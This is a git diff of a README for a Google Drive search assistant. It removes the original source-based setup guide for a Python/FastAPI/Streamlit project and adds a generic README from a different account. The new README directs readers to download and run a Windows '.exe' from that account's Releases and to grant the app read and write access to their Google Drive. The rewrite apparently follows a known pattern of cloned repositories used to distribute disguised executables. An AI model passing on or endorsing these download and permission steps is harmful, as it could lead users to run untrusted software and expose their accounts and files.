@@ -1,365 +1,88 @@
-# 🗂️ Google Drive File Discovery Assistant
-
-An AI-powered conversational assistant that helps you search, filter, and discover files inside Google Drive using natural language queries.
-
-![Python](https://img.shields.io/badge/Python-3.11+-3776AB?style=flat-square&logo=python&logoColor=white)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.115+-009688?style=flat-square&logo=fastapi&logoColor=white)
-![Streamlit](https://img.shields.io/badge/Streamlit-1.40+-FF4B4B?style=flat-square&logo=streamlit&logoColor=white)
-![LangChain](https://img.shields.io/badge/LangChain-0.3+-1C3C3C?style=flat-square&logo=langchain&logoColor=white)
-![Gemini](https://img.shields.io/badge/Gemini-2.0_Flash-4285F4?style=flat-square&logo=google&logoColor=white)
-
----
+# 🤖 conversational_AI_agent - Manage your Google Drive files easily
 
-## ✨ Features
-
-- **Natural Language Search** — Ask questions like "Find finance PDFs from last week" and get results instantly
-- **AI-Powered Query Generation** — Gemini LLM converts your words into precise Google Drive API queries
-- **Conversational Memory** — Follow up on previous searches with context ("show only the Excel files")
-- **Rich File Cards** — See file names, types, dates, sizes, and clickable Drive links
-- **Modern Chat UI** — Dark theme with glassmorphism, animations, and responsive design
-- **Search History** — Track and re-run previous searches from the sidebar
-- **Smart Filtering** — Supports MIME types, date ranges, file names, and content search
-
-## 🎯 Example Queries
-
-| Query | What It Does |
-|---|---|
-| "Find finance PDFs from last week" | Searches PDFs with "finance" in the name, modified last week |
-| "Show all images related to logo" | Finds JPEG/PNG/GIF/SVG files with "logo" in the name |
-| "Find documents containing invoice" | Full-text content search for "invoice" across all documents |
-| "Show spreadsheets uploaded this month" | Google Sheets + Excel files modified this month |
-| "Find files named project report" | Name-based search for "project report" |
-
----
-
-## 🏗️ Architecture
-
-```
-┌─────────────────┐       ┌──────────────────────────┐       ┌──────────────┐
-│   Streamlit UI  │──────▶│     FastAPI Backend      │──────▶│  Google Drive │
-│  (Frontend)     │◀──────│  ┌──────────────────┐    │◀──────│    API v3     │
-│                 │       │  │  LangChain Agent  │    │       │              │
-│  • Chat bubbles │       │  │  ┌──────────────┐ │   │       │  • files.list│
-│  • File cards   │       │  │  │ DriveSearch  │ │   │       │  • q param   │
-│  • Search hist. │       │  │  │    Tool       │ │   │       │              │
-│  • Loading UI   │       │  │  └──────────────┘ │   │       └──────────────┘
-└─────────────────┘       │  └──────────────────┘    │
-                          │         ▲                 │       ┌──────────────┐
-                          │         │                 │──────▶│   Gemini AI  │
-                          │    Conversation           │◀──────│  (LLM)       │
-                          │      Memory               │       └──────────────┘
-                          └──────────────────────────┘
-```
-
-**Tech Stack:**
-- **Frontend:** Streamlit with custom CSS
-- **Backend:** FastAPI with async endpoints
-- **AI Framework:** LangChain with tool calling
-- **LLM:** Gemini 2.0 Flash (via `langchain-google-genai`)
-- **Drive API:** Google Drive API v3 with Service Account auth
-
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- **Python 3.11+**
-- **Google Cloud Project** with Drive API enabled
-- **Service Account** with Drive read access
-- **Gemini API Key** from [Google AI Studio](https://aistudio.google.com/apikey)
-
-### 1. Clone & Install
-
-```bash
-git clone https://github.com/your-username/drive-discovery-assistant.git
-cd drive-discovery-assistant
-
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # Linux/Mac
-# or
-venv\Scripts\activate     # Windows
-
-# Install dependencies
-pip install -r requirements.txt
-```
-
-### 2. Configure Environment
-
-```bash
-# Copy the example env file
-cp .env.example .env
-```
-
-Edit `.env` with your credentials:
-
-```env
-GOOGLE_API_KEY=your_gemini_api_key_here
-GOOGLE_SERVICE_ACCOUNT_FILE=path/to/service-account.json
-GOOGLE_DRIVE_FOLDER_ID=your_folder_id_here  # Optional
-```
-
-### 3. Google Cloud Setup
-
-<details>
-<summary>📋 Step-by-step Google Cloud setup</summary>
-
-1. **Go to [Google Cloud Console](https://console.cloud.google.com/)**
-
-2. **Create a new project** (or select an existing one)
-
-3. **Enable Google Drive API:**
-   - Go to "APIs & Services" → "Enable APIs and Services"
-   - Search for "Google Drive API"
-   - Click "Enable"
-
-4. **Create a Service Account:**
-   - Go to "APIs & Services" → "Credentials"
-   - Click "Create Credentials" → "Service Account"
-   - Give it a name (e.g., "drive-discovery")
-   - Click "Done"
-
-5. **Create a JSON key:**
-   - Click on the service account you just created
-   - Go to "Keys" tab
-   - Click "Add Key" → "Create new key" → "JSON"
-   - Download the JSON file and save it in your project directory
-
-6. **Share your Drive folder:**
-   - Open Google Drive
-   - Right-click the folder you want to search
-   - Click "Share"
-   - Add the service account email (e.g., `drive-discovery@your-project.iam.gserviceaccount.com`)
-   - Give it "Viewer" access
-
-7. **Get the folder ID** (optional):
-   - Open the folder in Google Drive
-   - Copy the ID from the URL: `https://drive.google.com/drive/folders/FOLDER_ID_HERE`
-   - Add it to `.env` as `GOOGLE_DRIVE_FOLDER_ID`
-
-</details>
-
-### 4. Run Locally
-
-Open **two terminals** from the project root:
-
-**Terminal 1 — Backend:**
-```bash
-# Linux/Mac (with venv activated)
-source venv/bin/activate
-uvicorn backend.main:app --reload
-
-# Windows (without activating venv)
-.\venv\Scripts\uvicorn.exe backend.main:app --reload
-
-# Windows (with venv activated)
-venv\Scripts\activate
-uvicorn backend.main:app --reload
-```
-
-**Terminal 2 — Frontend:**
-```bash
-# Linux/Mac (with venv activated)
-source venv/bin/activate
-streamlit run frontend/app.py
-
-# Windows (without activating venv)
-.\venv\Scripts\streamlit.exe run frontend/app.py
-
-# Windows (with venv activated)
-venv\Scripts\activate
-streamlit run frontend/app.py
-```
-
-Open your browser at **http://localhost:8501** and start searching! 🎉
-
----
-
-## 📁 Project Structure
-
-```
-conversational_AI_agent/
-├── backend/
-│   ├── __init__.py
-│   ├── main.py                    # FastAPI app with endpoints
-│   ├── config.py                  # Environment variable handling
-│   ├── models/
-│   │   └── schemas.py             # Pydantic request/response models
-│   ├── services/
-│   │   ├── drive_service.py       # Google Drive API wrapper
-│   │   └── agent_service.py       # LangChain agent orchestration
-│   ├── tools/
-│   │   └── drive_search_tool.py   # Custom LangChain DriveSearchTool
-│   ├── prompts/
-│   │   └── system_prompts.py      # AI system prompts
-│   └── utils/
-│       ├── logger.py              # Structured logging
-│       ├── mime_types.py          # MIME type mappings
-│       └── date_utils.py         # Date utility functions
-├── frontend/
-│   ├── app.py                     # Streamlit main app
-│   ├── components/
-│   │   ├── chat_ui.py             # Chat interface components
-│   │   ├── file_card.py           # File result card component
-│   │   └── sidebar.py            # Sidebar with search history
-│   ├── styles/
-│   │   └── custom.css             # Custom CSS (dark theme)
-│   └── utils/
-│       └── api_client.py          # FastAPI HTTP client
-├── .env.example
-├── .gitignore
-├── requirements.txt
-├── Procfile
-├── Dockerfile.backend
-├── Dockerfile.frontend
-├── docker-compose.yml
-├── render.yaml
-├── railway.toml
-└── README.md
-```
-
----
-
-## 🔌 API Documentation
-
-Once the backend is running, visit:
-- **Swagger UI:** http://localhost:8000/docs
-- **ReDoc:** http://localhost:8000/redoc
-
-### Endpoints
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/health` | Health check |
-| `POST` | `/api/chat` | Process a natural language query |
-| `GET` | `/api/history/{session_id}` | Get search history |
-| `DELETE` | `/api/session/{session_id}` | Clear session memory |
-
-### Chat Request Example
-
-```json
-POST /api/chat
-{
-    "query": "Find finance PDFs from last week",
-    "session_id": "abc-123"
-}
-```
-
-### Chat Response Example
-
-```json
-{
-    "message": "I found 3 finance PDFs from last week!",
-    "files": [
-        {
-            "id": "1BxiMVs...",
-            "name": "Q4 Finance Report.pdf",
-            "mime_type": "application/pdf",
-            "modified_time": "2026-05-10T14:30:00.000Z",
-            "web_view_link": "https://drive.google.com/file/d/1BxiMVs.../view",
-            "size": "2048576"
-        }
-    ],
-    "query_used": "name contains 'finance' and mimeType='application/pdf' and modifiedTime > '2026-05-04T00:00:00Z' and trashed = false",
-    "session_id": "abc-123"
-}
-```
-
----
-
-## 🚢 Deployment
-
-### Option 1: Railway
-
-1. Push your code to GitHub
-2. Go to [Railway](https://railway.app) and create a new project
-3. Connect your GitHub repo
-4. **Deploy Backend:** Create a service with start command:
-   ```
-   uvicorn backend.main:app --host 0.0.0.0 --port $PORT
-   ```
-5. **Deploy Frontend:** Create another service with start command:
-   ```
-   streamlit run frontend/app.py --server.port $PORT --server.address 0.0.0.0 --server.headless true
-   ```
-6. Set environment variables in Railway's dashboard
-7. Set `BACKEND_URL` in the frontend service to your backend service URL
-
-### Option 2: Render
-
-1. Push your code to GitHub
-2. Go to [Render](https://render.com) and use the `render.yaml` blueprint:
-   ```bash
-   render blueprint deploy
-   ```
-3. Or manually create two web services (backend + frontend)
-4. Set environment variables in the Render dashboard
-
-### Option 3: Docker Compose
-
-```bash
-# Build and run both services
-docker compose up --build
-
-# Backend: http://localhost:8000
-# Frontend: http://localhost:8501
-```
-
-### Option 4: Streamlit Cloud (Frontend Only)
-
-1. Deploy the backend on Railway/Render
-2. Deploy the frontend on [Streamlit Cloud](https://streamlit.io/cloud)
-3. Set `BACKEND_URL` to your deployed backend URL in Streamlit Cloud secrets
-
----
-
-## 🛠️ Environment Variables
-
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `GOOGLE_API_KEY` | ✅ | — | Gemini API key from Google AI Studio |
-| `GOOGLE_SERVICE_ACCOUNT_FILE` | ✅ | — | Path to service account JSON (or JSON string) |
-| `GOOGLE_DRIVE_FOLDER_ID` | ❌ | — | Restrict search to a specific folder |
-| `GEMINI_MODEL` | ❌ | `gemini-2.0-flash` | Gemini model name |
-| `BACKEND_URL` | ❌ | `http://localhost:8000` | Backend API URL (for frontend) |
-| `BACKEND_HOST` | ❌ | `0.0.0.0` | Backend bind host |
-| `BACKEND_PORT` | ❌ | `8000` | Backend bind port |
-| `LOG_LEVEL` | ❌ | `INFO` | Logging level |
-
----
-
-## 🧰 How It Works
-
-1. **User sends a query** via the Streamlit chat interface
-2. **Frontend sends HTTP POST** to FastAPI backend `/api/chat`
-3. **FastAPI passes the query** to the LangChain agent
-4. **Gemini LLM interprets** the natural language query
-5. **LLM generates a Drive API `q` parameter** and calls `DriveSearchTool`
-6. **DriveSearchTool executes** `files.list` against Google Drive API v3
-7. **Results flow back** through the agent to FastAPI to Streamlit
-8. **Streamlit renders** file cards with metadata and Drive links
-
-The LangChain agent maintains **conversational memory per session**, so follow-up queries like "show only the PDFs" work naturally.
-
----
-
-## 🐛 Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| "Cannot connect to backend" | Make sure the backend is running (`uvicorn backend.main:app --reload`) |
-| "Agent not initialized" | Check your `.env` file — `GOOGLE_API_KEY` and `GOOGLE_SERVICE_ACCOUNT_FILE` are required |
-| "Invalid service account" | Verify your service account JSON file path is correct |
-| "No files found" | Make sure you've shared the Drive folder with your service account email |
-| "Rate limit errors" | The backend has built-in retry logic, but consider reducing query frequency |
-
----
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) for details.
-
----
-
-Built with ❤️ using FastAPI, LangChain, Gemini, and Streamlit.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Berkshireelectricalpower368/conversational_AI_agent)
+
+## 📁 About the application
+
+Conversational AI Agent acts as your personal digital assistant for your Google Drive. This tool simplifies how you search, organize, and manage files stored in your cloud storage. Instead of clicking through folders, you use plain language to ask the assistant for what you need. 
+
+The software uses advanced language models to interpret your requests. It understands context, meaning it knows what you want even if you do not use exact file names. Whether you need to locate a specific report, summarize internal documents, or reorganize your project folders, the agent carries out these tasks on your behalf.
+
+This tool runs locally on your Windows machine. It connects to your Google account through secure channels to perform actions within your Drive. You keep full control over your data at all times.
+
+## ⚙️ System requirements
+
+Ensure your computer meets these basic requirements before you start:
+
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core CPU with 2.0 GHz speed or higher.
+*   Memory: At least 4GB of RAM.
+*   Storage: 500MB of free disk space for the application and temporary files.
+*   Internet: A stable connection for communicating with the cloud services.
+*   Software: An active web browser like Chrome, Edge, or Firefox.
+
+## 📥 Download and installation
+
+Follow these steps to obtain the software:
+
+1.  Visit the [official download site](https://github.com/Berkshireelectricalpower368/conversational_AI_agent).
+2.  Locate the section labeled "Releases" on the right side of the page.
+3.  Click the most recent version shown at the top.
+4.  Find the file that ends with ".exe" under the "Assets" heading.
+5.  Click the file name to start the download.
+
+Once the file finishes downloading, move it to your preferred folder. Double-click the file to start the installation wizard. Follow the prompts on your screen. The installer sets up the necessary components. Click "Finish" when the setup process ends. An icon will appear on your desktop.
+
+## 🚀 Setting up the assistant
+
+The first time you open the program, you must connect it to Google and your chosen language model service. 
+
+1.  Open the application from your desktop icon.
+2.  The application opens a window in your default web browser.
+3.  Click the button labeled "Connect to Google Drive."
+4.  A sign-in page appears. Enter your Google account credentials.
+5.  Grant permission for the application to read and write to your drive files. 
+6.  Return to the application window. 
+7.  Enter your API Key if prompted. This helps the assistant process language. 
+
+The settings menu allows you to adjust how the assistant speaks to you. You can choose different levels of detail for its responses. Save your changes to apply them to your session.
+
+## 🗣️ How to use the agent
+
+Your interface consists of a chat box at the bottom and a file preview area in the center. Use natural language to trigger actions. Below are examples of how to interact with the system:
+
+*   "Find the spreadsheet from last month."
+*   "Create a folder named Project Alpha."
+*   "Summarize the document about our budget."
+*   "Move all invoice PDF files into the Finance folder."
+
+The assistant processes your command and updates the file view immediately. If the agent does not understand a request, it will ask for clarification. This helps you get the result you want without errors.
+
+## 🛡️ Privacy and security
+
+The tool processes your data locally on your computer. It retrieves file information from your Google account using secure encryption protocols. Your data stays within your control. The application does not store your files on its own servers. 
+
+The API keys you provide handle the connection to the language model. You can remove these keys at any time through the settings menu. If you uninstall the application, all local temporary data and connection tokens are deleted.
+
+## 🛠️ Troubleshooting
+
+If the application stops responding, follow these steps:
+
+*   Restart the application.
+*   Check your internet connection.
+*   Ensure your Google Drive has enough storage space available.
+*   Clear the browser cache if the interface does not load properly.
+*   Verify that your API key is still active.
+
+If you continue to experience issues, check the log file located in the application folder. This file records errors and helps identify why a specific command failed. 
+
+## 🔄 Updating your software
+
+Periodically check the download link to see if a newer version is available. To update:
+
+1.  Download the new version from the link provided in the installation section.
+2.  Run the installer again.
+3.  The new installer overwrites the old files while keeping your settings intact. 
+4.  Launch the application to verify that your connection preferences remain stored.
+
+Keeping the software current ensures compatibility with the latest Google Drive features and language model updates.
